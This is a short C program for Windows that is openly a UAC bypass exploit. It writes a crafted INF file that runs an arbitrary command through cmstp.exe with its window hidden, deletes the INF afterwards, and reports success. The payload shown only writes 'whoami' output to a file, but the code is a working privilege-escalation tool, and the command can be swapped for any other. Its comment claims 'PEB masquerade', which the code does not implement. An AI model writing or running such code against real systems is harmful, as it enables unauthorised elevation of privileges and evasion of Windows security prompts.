#include <windows.h>
#include <stdio.h>

int main() {
    // Simple PEB masquerade + CMSTPLUA
    const char* payload = "cmd.exe /c \"whoami > C:\\elevated_success.txt & echo UAC BYPASSED VIA PEB CMSTPLUA 2026 > C:\\uac_bypassed.txt & timeout 10\"";

    // Create INF
    system("mkdir C:\\temp 2>nul");
    FILE *f = fopen("C:\\temp\\bypass.inf", "w");
    if (f) {
        fprintf(f, "[version]\r\nSignature=$chicago$\r\nAdvancedINF=2.5\r\n\r\n[DefaultInstall]\r\nCustomDestination=CustInstDestSectionAllUsers\r\nRunPreSetupCommands=RunPreSetupCommandsSection\r\n\r\n[RunPreSetupCommandsSection]\r\n%s\r\n\r\n[CustInstDestSectionAllUsers]\r\n49000,49001=AllUSer_LDIDSection, 7\r\n\r\n[AllUSer_LDIDSection]\r\n\"HKLM\", \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE\", \"ProfileInstallPath\", \"%%UnexpectedError%%\", \"\"\r\n\r\n[Strings]\r\nServiceName=\"CMSTPLUA\"\r\n", payload);
        fclose(f);
    }

    // Trigger with basic PEB spoof attempt via parent process
    ShellExecuteA(NULL, "open", "C:\\Windows\\System32\\cmstp.exe", "/s C:\\temp\\bypass.inf", NULL, SW_HIDE);

    Sleep(12000);

    DeleteFileA("C:\\temp\\bypass.inf");

    printf("[+] PEB CMSTPLUA triggered. Check C:\\ files.\n");
    return 0;
}
